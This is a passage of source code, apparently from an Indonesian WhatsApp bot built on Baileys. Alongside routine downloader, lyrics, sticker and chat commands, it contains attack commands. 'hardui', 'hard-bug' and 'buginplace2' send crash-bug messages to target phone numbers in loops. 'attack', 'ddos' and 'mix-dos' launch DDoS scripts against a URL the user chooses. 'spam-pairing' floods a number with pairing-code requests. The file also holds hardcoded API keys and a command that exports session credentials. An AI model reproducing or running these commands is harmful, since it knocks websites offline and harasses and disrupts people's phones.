await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Title:* ${result.title}"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await client.sendMessage(m.chat,{
			 video: {url: urlVid.url},
					caption: `*TITLE:* ${result.title}`,
					footer: global.namabot,					buttons: [
						{
							buttonId: `.ttaudio ${text}`,
							buttonText: {
								displayText: "DOWNLOAD AUDIO"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await client.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return reply(`⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *${prefix + command} <url>*`);
				try {
					let anu = await tiktokDl(text);
					let audio = anu.music_info.url;					
					await client.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await reply(`❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!: ${error}`);
				}
			}
break
case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

case "qc2": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await client.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": "#000000",
 "width": 812,
 "height": 968,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": m.pushName,
 "photo": {
 "url": ppuser
 }
 },
 "text": text,
 "replyMessage": {}
 }
 ]
};
 const response = axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
 const buffer = Buffer.from(res.data.result.image, 'base64')
 let tempnya = "./database/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await client.sendStimage(m.chat, tempnya, m, {packname: `Dikzz`})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "leave": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await client.groupLeave(m.chat)
}
break

case "joinch": case "joinchannel": {
if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
await client.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

case 'ttstalk':{
//wm senn
async function tiktokStalk(user) {
 let res = await axios.get(`https://urlebird.com/user/${user}/`)
//wm senn
 let $ = cheerio.load(res.data), obj = {}
 obj.pp_user = $('div[class="col-md-auto justify-content-center text-center"] > img').attr('src')
 obj.name = $('h1.user').text().trim()
//wm senn
 obj.username = $('div.content > h5').text().trim()
 obj.followers = $('div[class="col-7 col-md-auto text-truncate"]').text().trim().split(' ')[1]
//wm senn
 obj.following = $('div[class="col-auto d-none d-sm-block text-truncate"]').text().trim().split(' ')[1]
//wm senn
 obj.description = $('div.content > p').text().trim()
 return obj
//wm senn
} 
if (!text) return m.reply(`Masukan nama pengguna!!\nExample ${prefix + command} sen.h`)
//wm senn
let data = await tiktokStalk(text)
let cap = `\`\`\`「 Tiktok Stalk 」\`\`\`

Nama : ${data.name}
Username : ${data.username}
Pengikut : ${data.followers}
Mengikuti : ${data.following}
Bio : ${data.description}
`

client.sendMessage(m.chat, { image: { url: data.pp_user }, caption: cap }, { quoted: m })

}
break
case 'lirik': { 
if (!text) return reply(`Masukkan lirik atau judulnya`);
await loading()
try {
 const response = await fetch(`https://api.nyxs.pw/tools/lirik?title=${encodeURIComponent(text)}`);
 
 if (!response.ok) throw new Error('Gagal menghubungi API');

 const data = await response.json();
 
 if (!data.result) throw new Error('Lirik tidak ditemukan');

 const bjir = data.result;
 let Lrk = `> *INI LIRIKNYA*\n\n${bjir}`
 await reply(Lrk);
 } 
 catch (e) {
 m.reply(`Error: ${e.message}`);
 }
}
break

case 'soundmeme': {
 // Mengambil data dari API menggunakan method GET
 let response = await fetch("https://skizoasia.xyz/api/memes?apikey=Rangelofficial", {
 method: 'GET', // Menggunakan method GET
 headers: {
 'Content-Type': 'application/json', // Menyatakan tipe konten jika diperlukan
 },
 });
 
 if (!response.ok) throw new Error("Gagal mengambil data");

 let result = await response.json();
 if (!result || result.length === 0) throw new Error("Meme suara tidak tersedia");

 // Ambil meme suara acak dari daftar
 let meme = result[Math.floor(Math.random() * result.length)];
reply('_wait sedang mencari sound_')
 // Kirimkan informasi meme suara
 await reply(`🎵 *${meme.title}* \n🔗 [Link](${meme.link})`);

 // Kirim audio
 await client.sendMessage(m.chat, {
 audio: { url: meme.audioUrl },
 mimetype: 'audio/mp4',
 ptt: true // Opsi ini untuk mengirim sebagai pesan suara (PTT)
 },{quoted:m});

 } 
break
case 'idch':
case 'cekidch': {
 if (!isOwner) return reply(mess.only.owner);

 // Ensure the message is a reply to a forwarded message
 if (!m.quoted || !m.quoted.id || !m.quoted.contextInfo) {
 return reply('Silakan balas pesan yang diteruskan dari channel.');
 }

 try {
 console.log('Quoted Object:', JSON.stringify(m.quoted, null, 2));

 let contextInfo = m.quoted.contextInfo;

 // Check if the message is from a channel
 if (contextInfo.forwardedNewsletterMessageInfo) {
 let forwardedInfo = contextInfo.forwardedNewsletterMessageInfo;
 let channelId = forwardedInfo.newsletterJid;
 let channelName = forwardedInfo.newsletterName;

 // Prepare the response with channel data
 let send_ch = `*Data Channel Anda:*\n` +
 `*Nama Channel*: ${channelName}\n` +
 `*ID Channel*: ${channelId}`;
 await reply(send_ch);
 } else {
 // Message is not from a valid channel
 return reply('ID atau nama channel tidak ditemukan. Pastikan pesan berasal dari channel yang valid.');
 }
 } catch (e) {
 console.log('Error:', e.message);
 reply('Terjadi kesalahan saat mengambil data dari pesan yang diteruskan. Pastikan pesan tersebut adalah dari channel.');
 }
}
break;

case 'tekstoimg':
case 'txt2img': {
if (!text) return reply(`Example: ${prefix + command} cat`)
async function photoleap(prompt) {
 try {
 let result = []
 for (let i = 0; i < 3; i++) {
 let {
 data
 } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
 result.push(data.result_url)
 }
 return result
 } catch (e) {
 return ({
 msg: 404
 })
 }
}

let tahu = await photoleap(text)
for (const x of tahu) {
client.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break

case "play2": {
 const axios = require("axios");
 if(!isGroup) return reply(`*Khusus di dalam grup blok goblok*`)
 if (!text) return reply('Masukkan Judul Contoh\nContoh La Vagualette!');

 await loading();

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;

 // Pilih hasil pertama dari data pencarian
 const data = searchData.data[0];
 if (!data) return reply("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `_###_ YOUTUBE PLAYER ###

- Judul: ${data.title}
- Artis: ${data.author.name}
- URL: ${data.url}`;

 // Mengirim pesan informasi lagu
 await client.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title: `${data.title}`,
 body: "YOUTUBE SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: qchanel });

 // URL API untuk download lagu
 const downloadApiUrl = `https://api.nexoracle.com/downloader/yt-audio?apikey=free_key@maher_apis&url=${encodeURIComponent(data.url)}`;
 const downloadData = (await axios.get(downloadApiUrl)).data;

 // Cek jika status berhasil
 if (downloadData.status === 200 && downloadData.result.audio) {
 const audioUrl = downloadData.result.audio;
 const title = downloadData.result.title || "Audio";
 const thumbnail = downloadData.result.thumb;

 // Mengirim audio melalui WhatsApp
 await client.sendMessage(m.chat, { 
 audio: { url: audioUrl }, 
 mimetype: 'audio/mpeg',
 fileName: `${title}.mp3`,
 thumbnail: thumbnail
 }, { quoted: m });
 } else {
 reply("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.log(error);
 reply("Terjadi kesalahan saat mengambil file audio.");
 }
}
break
case 'ai':
case 'gpt': 
case 'chatgpt':
case 'gpt4': {
 if (!text) return reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil 
let response = await axios.post("https://chateverywhere.app/api/chat/", {
 "model": {
 "id": "gpt-4",
 "name": "GPT-4",
 "maxLength": 32000, // Sesuaikan token limit jika diperlukan
 "tokenLimit": 8000, // Sesuaikan token limit untuk model GPT-4
 "completionTokenLimit": 5000, // Sesuaikan jika diperlukan
 "deploymentName": "gpt-4"
 },
 "messages": [
 {
 "pluginId": null,
 "content": text, 
 "role": "user"
 }
 ],
 "prompt": logic, 
 "temperature": 0.5
 }, { 
 headers: {
 "Accept": "/*/",
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
 }
 });
 
 let result = response.data;
 return result;
}

let kanjuthann = await openai(text, "nama mu adalah Tobrut idaman, kamu adalah asisten kecerdasan buatan dari .Dikzz. yang sering membantu orang lain jika ada yang ditanyakan")
reply(kanjuthann)
}
break
case "splay":
case "play-music":
case "sspotify": {
    if (!text) return reply(`Masukkan judul lagu yang ingin Anda cari, Contoh: ${prefix + command} gala bunga mataharia`);
    
    loading();
    
    try {
        let response = await axios.get(`https://fgsi-spotify.hf.space/query=${encodeURIComponent(text)}`);
        let data = response.data;

        if (!data.status) return m.reply(`Error: ${data.msg}`);

        let { title, artist, duration, popularity, preview, thumbnail: thumbnailUrl, url } = data.result;
        let audioUrl = data.audio.url;

        const thumbnails = await axios.get(thumbnailUrl, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await client.sendMessage(m.chat, {
            image: thumbnail,
            caption: `🎵 *${title}*\n👤 *Artist:* ${artist}\n⏳ *Duration:* ${duration}\n✨ *Rate Song:* ${popularity}\n📌 *Preview:* ${preview || "No preview available"}\n🔗 *Spotify Link:* ${url}`,
        }, { quoted: m });

        await client.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat mengambil lagu dari spotify.");
    }
}
break
case 'hardui':
case 'bug-ui':
case 'xblank': {
if (!isOwner && !isMurbug) return reply("*KHUSUS MURBUG*")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗦𝗘𝗡𝗗𝗘𝗥 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛")
for (let i = 0; i < 100; i++) {
await sleep(3000)
await hardui(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'medium-bug': {
if (!isOwner && !isMurbug) return reply(`*KHUSUS PREMIUM*`)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗦𝗘𝗡𝗗𝗘𝗥 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛")
for (let i = 0; i < 70; i++) {
await XeonButtNew(target, ptcp = true)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'hard-bug': {
if (!isOwner && !isMurbug) return reply(`*KHUSUS PREMIUM*`)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗦𝗘𝗡𝗗𝗘𝗥 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛")
for (let i = 0; i < 50; i++) {
await XeonButtNew(target)
await sleep(4000)
await Delaymessage(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break    
case "attack": case "ddos": {
const fetch = require('node-fetch');
const axios = require('axios');
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url');
let globalCooldown = null; // Global cooldown variable to track ongoing attacks
if (args.length < 3) return reply(`[🔎] .${command} [url] [duration] [methode]`);

 const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

 if (blacklistedDomains.some(domain => args[0].includes(domain))) {
 return reply(`❌ Blacklisted Target.`);
 }

 const target = args[0];
 let duration = parseInt(args[1]);
 const methods = args[2];
 const maxDuration = 60; // Maximum duration limit (in seconds)

 if (duration > maxDuration) {
 return reply(`❌ Durasi terlalu lama, batas maksimal adalah ${maxDuration} detik`);
 }

 const parsedUrl = new url.URL(target);
 const hostname = parsedUrl.hostname;
 const path = parsedUrl.pathname;
 const thumb = global.attacking;
 const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);

 const result = response.data;

 const deepinfo = `Isp: ${result.isp} 
\`Ip:\` ${result.query}
\`AS:\` ${result.as} 
\`Running Free Attack: 1/1\`
➖➖➖➖➖➖➖➖➖➖➖
\`Attack Powwerd by: ( @Dikzz )\``

 const details = `*Attack Successfully✅* 
 
\`Target:\` ${target} 
\`Methods:\` ${methods} 
\`Duration:\` ${duration} 
${deepinfo}`;

 // Check if a global cooldown is in place
 if (globalCooldown) {
 const remainingTime = globalCooldown - Date.now();
 if (remainingTime > 0) {
 return reply(`❌ Harap tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum melakukan serangan lagi.`);
 }
 }
 // Set global cooldown
 globalCooldown = Date.now() + duration * 1000;

 if (methods === 'browsers') {
 await client.sendMessage(m.chat, {
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: `Attacking ${target}`,
 body: `Check Host Click Me`,
 mediaType: 1,
 thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }
 }, text: details
 }, { quoted: m })
 exec(`node ./lib/RanXBrowsers.js ${target} ${duration} 100 10`)
 } else if (methods === 'kill') {
 await client.sendMessage(m.chat, {
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: `Attacking ${target}`,
 body: `Check-Host Click Me`,
 mediaType: 1,
 thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }
 }, text: details
 }, { quoted: m })
 exec(`node ./lib/RanXKill.js ${target} ${duration} 100 10 proxy.txt`)
} else if (methods === 'bypass') {
 await client.sendMessage(m.chat, {
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: `Attacking ${target}`,
 body: `Check-Host Click Me`,
 mediaType: 1,
 thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }
 }, text: details
 }, { quoted: m })
 exec(`node ./lib/RanXBypass.js ${target} ${duration} 100 10 proxy.txt`)
} else {
 reply(`_*Unknown Methods*_`);
 }

 // Clear the global cooldown after the duration
 setTimeout(() => {
 globalCooldown = null;
 }, duration * 1000);
}
break

case 'buginplace2':
if (!isOwner) return reply(mess.only.owner)
target = m.chat
reply(bugres)
for (let i = 0; i < 50; i++) {
await DocSystem(target, ptcp = true) 
await offerCall(target, Ptcp = true)
await gabisaBuka(target)
await FrezeeMsg2(target, ptcp = true)
await sleep(10000)
}
reply(`*_<\> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case 'karepmu':
case 'buginplace':
if (!isOwner);
target = m.chat
for (let i = 0; i < 1; i++) {
await XeonButtNew(target, ptcp = true)
}
break
case 'ig':
case 'igdl': 
case 'instagram': {
const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio');
//scrape by: https://whatsapp.com/channel/0029VavOkL00lwgmRLmffH1i/158
const instadl = async (url) => {
 let data = qs.stringify({
 'url': url,
 'v': '3',
 'lang': 'en'
 });

 let config = {
 method: 'POST',
 url: 'https://api.downloadgram.org/media',
 headers: {
 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
 'Content-Type': 'application/x-www-form-urlencoded',
 'accept-language': 'id-ID',
 'referer': 'https://downloadgram.org/',
 'origin': 'https://downloadgram.org',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'priority': 'u=0',
 'te': 'trailers'
 },
 data: data
 };

 try {
 const response = await axios.request(config);
 const $ = cheerio.load(response.data);
 let mediaInfo = {};

 if ($('video').length) {
 mediaInfo.videoUrl = $('video source').attr('src');
 } else if ($('img').length) {
 mediaInfo.imageUrl = $('img').attr('src');
 }

 for (let key in mediaInfo) {
 if (mediaInfo.hasOwnProperty(key)) {
 mediaInfo[key] = mediaInfo[key].replace(/\\\\"/g, '').replace(/\\"/g, '');
 }
 }

 return mediaInfo;
 } catch (error) {
 return { error: 'Error: ' + error.message };
 }
};
 if (!args[0]) {
 return reply('*CONTOH:* .igdl Url');
 }

 const url = args[0];
 if (!/^https?:\/\/(www\.)?instagram\.com/.test(url)) {
 return reply('gak valid.');
 }
 loading()

 const result = await instadl(url);
 if (result.error) {
 return reply(`emror: ${result.error}`);
 }

 if (result.videoUrl) {
 try {
 const videoBuffer = await axios.get(result.videoUrl, { responseType: 'arraybuffer' });
 await client.sendMessage(m.chat, { video: Buffer.from(videoBuffer.data), caption: '✅ Video berhasil' });
 } catch (error) {
 reply('Gagal mengunduh dan mengirim video.');
 }
 } else if (result.imageUrl) {
 try {
 const imageBuffer = await axios.get(result.imageUrl, { responseType: 'arraybuffer' });
 await client.sendMessage(m.chat, { image: Buffer.from(imageBuffer.data), caption: '✅ Gambar berhasil' });
 } catch (error) {
 reply('Gagal mengunduh dan mengirim gambar.');
 }
 } else {
 reply('Media tidak ditemukan di URL yang diberikan.');
 }
 }
break
case 'aimagine': {
 if (!text) return reply(`_Masukan Promptnya_\nContoh: ${prefix + command} buatkan saya foto anime dengan wajah cantik :v`);
 try {
 let ima = await (await fetch(`https://endpoint.web.id/ai/animagine?key=${global.key}&prompt=${text}`)).json()
 let hasil = ima.result[0]
 await client.sendMessage(m.chat, { image: { url: hasil }, caption: 'done' }, { quoted: m });
 } catch (e) {
 console.log(e)
 return reply('error');
 }
}
break
case "terabox": {
 if (!text) return reply(`Gunakan perintah:\n${prefix + command} <link terabox>`);
 try {
 const result = await terabox(text);
 if (!result.length) return reply('gagal mendapatkan file. Pastikan link valid.');
//wm https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
 for (let i = 0; i < result.length; i++) {
 const { fileName, type, thumb, url } = result[i];
 const caption = `📄 *Nama File:* ${fileName}\n📂 *Tipe:* ${type}`;
 
 //wm https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
 await client.sendMessage(m.chat, url, fileName, caption, m, false, {
 thumbnail: thumb ? await getBuffer(thumb) : null
 });
 }
 } catch (err) {
 console.log(err);
 reply('Terjadi kesalahan saat memproses permintaan Anda.');
 }
};
//SCRAPE
async function terabox(url) {
 return new Promise(async (resolve, reject) => {
 await axios
 .post('https://teradl-api.dapuntaratya.com/generate_file', {
 mode: 1,
 url: url
 })
 .then(async (a) => {
 const array = [];
 for (let x of a.data.list) {
 let dl = await axios
 .post('https://teradl-api.dapuntaratya.com/generate_link', {
 js_token: a.data.js_token,
 cookie: a.data.cookie,
 sign: a.data.sign,
 timestamp: a.data.timestamp,
 shareid: a.data.shareid,
 uk: a.data.uk,
 fs_id: x.fs_id
 })
 .then((i) => i.data)
 .catch((e) => e.response);

 if (!dl.download_link) continue;

 array.push({
 fileName: x.name,
 type: x.type,
 thumb: x.image,
 url: dl.download_link.url_1
 });
 }
 resolve(array);
 })
 .catch((e) => reject(e.response.data));
 });
}


async function getBuffer(url) {
 try {
 const res = await axios({
 method: 'get',
 url,
 responseType: 'arraybuffer'
 });
 return res.data;
 } catch (err) {
 console.log(err);
 return null;
 }
}
break
case 'spam-pairing': {
		 if (!isOwner) return reply(mess.owner)
			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx`)
				let [peenis, pepekk = "200"] = q.split("|")
				await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('baileys')
				let {
					state
				} = await useMultiFileAuthState('tmp')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await client.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
			break

		case "speed":
				reply(`*${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Seconds*`)
				break

// nih rvo
case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return client.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return client.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return client.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'mix-dos': {
				if (!isPremium && !isOwner) return reply(mess.only.premium)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./lib/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					reply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
				}
			}
			break

case "attp": {
const fetch = require("node-fetch");
const cheerio = require("cheerio");
const { Sticker, StickerTypes } = require("wa-sticker-formatter");
 if (!text) return reply(`*• Example :* ${prefix + command} *[text]*`);

 async function ttp(text) {
 try {
 const response = await fetch("https://www.picturetopeople.org/p2p/text_effects_generator.p2p/transparent_text_effect", {
 method: "POST",
 headers: {
 "Content-Type": "application/x-www-form-urlencoded",
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
 Cookie: "_ga=GA1.2.1667267761.1655982457; _gid=GA1.2.77586860.1655982457; __gads=ID=c5a896288a559a38-224105aab0d30085:T=1655982456:RT=1655982456:S=ALNI_MbtHcmgQmVUZI-a2agP40JXqeRnyQ; __gpi=UID=000006149da5cba6:T=1655982456:RT=1655982456:S=ALNI_MY1RmQtva14GH-aAPr7-7vWpxWtmg; _gat_gtag_UA_6584688_1=1",
 },
 body: new URLSearchParams({
 TextToRender: text,
 FontSize: "100",
 Margin: "30",
 LayoutStyle: "0",
 TextRotation: "0",
 TextColor: "ffffff",
 TextTransparency: "0",
 OutlineThickness: "3",
 OutlineColor: "000000",
 FontName: "Lekton",
 ResultType: "view",
 }).toString(),
 });

 const bodyText = await response.text();
 const $ = cheerio.load(bodyText);
 const results = [];

 $('form[name="MyForm"]').each((index, formElement) => {
 const resultFile = $(formElement).find('#idResultFile').attr('value');
 const refTS = $(formElement).find('#idRefTS').attr('value');
 if (resultFile) {
 results.push({
 creator: 'TanakaDomp',
 url: 'https://www.picturetopeople.org' + resultFile,
 title: refTS
 });
 }
 });

 return results;
 } catch (error) {
 console.log('Error:', error);
 return [];
 }
 }

 
 const result = await ttp(text);
 if (result.length > 0) {
 const imageUrl = result[0].url;

 
 const sticker = new Sticker(imageUrl, {
 pack: "085850185698",
 author: namabot,
 type: StickerTypes.FULL,
 categories: ['🤩', '🎉'],
 id: '12345',
 quality: 70,
 background: '#FFFFFF00'
 });

 const stickerBuffer = await sticker.toBuffer();

 
 await client.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
 } else {
 reply("⚠️ Gagal menghasilkan TTP. Coba lagi nanti.");
 }
}
break

case "beton": {
client.sendMessage(m.chat, {
 text: "beton",
 caption: "woylah cik",
 footer: "footer",
 buttons: [
 {
 buttonId: ".tes1", 
 buttonText: { 
 displayText: 'Tes1' 
 }
 }, {
 buttonId: ".tes2", 
 buttonText: {
 displayText: "Tes2"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
} 
break

case 'button1':
 const buttons = [{
 name: 'quick_reply',
 buttonParamsJson: JSON.stringify({
 display_text: 'Runtime',
 id: `${prefix}run`
 })
 }, {
 name: 'single_select',
 buttonParamsJson: JSON.stringify({
 title: 'Tap Here!',
 sections: [{
 rows: [{
 title: 'Dummy 1',
 // description: `X`,
 id: `${prefix}run`
 }, {
 title: 'Dummy 2',
 // description: `Y`,
 id: `${prefix}run`
 }]
 }]
 })
 }]
 client.sendMessage(m.chat, buttons, m, {
 header: '',
 content: 'Hi! @0',
 footer: global.namabot,
 media: global.imageurl
 })
 break

case 'button5': // Button 5 (Carousel)
 const cards = [{
 header: {
 imageMessage: menugmbr,
 hasMediaAttachment: true,
 },
 body: {
 text: "P"
 },
 nativeFlowMessage: {
 buttons: [{
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: 'Community',
 url: global.ucch,
 webview_presentation: null
 })
 }]
 }
 }, {
 header: {
 imageMessage: menugmbr,
 hasMediaAttachment: true,
 },
 body: {
 text: "P"
 },
 nativeFlowMessage: {
 buttons: [{
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: 'Neoxr API',
 url: 'https://api.neoxr.eu',
 webview_presentation: null
 })
 }]
 }
 }]

 client.sendCarousel(m.chat, cards, m, {
 content: 'Hi!'
 })
 break

case "sound7": {
await client.sendMessage(m.chat, {audio: {url: "./image/ahah.mp3" }, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'mysesi': case 'sendsesi': case 'session':{
if (!isOwner) return reply(mess.Owner)
reply('please wait..')
await sleep(3000)

// Read Database
var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./session/creds.json`)

// Sending Document
client.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted: m})
client.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted: m})
}
break
case 'cekprovider': {
if (!isPremium) return reply(mess.only.premium)
if (!text) return reply(`Example: ${prefix + command} 6287872627288`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
reply(JSON.stringify(result, null, 2));
} catch (error) {
reply(`Error: ${error.message}`);
}
}
break
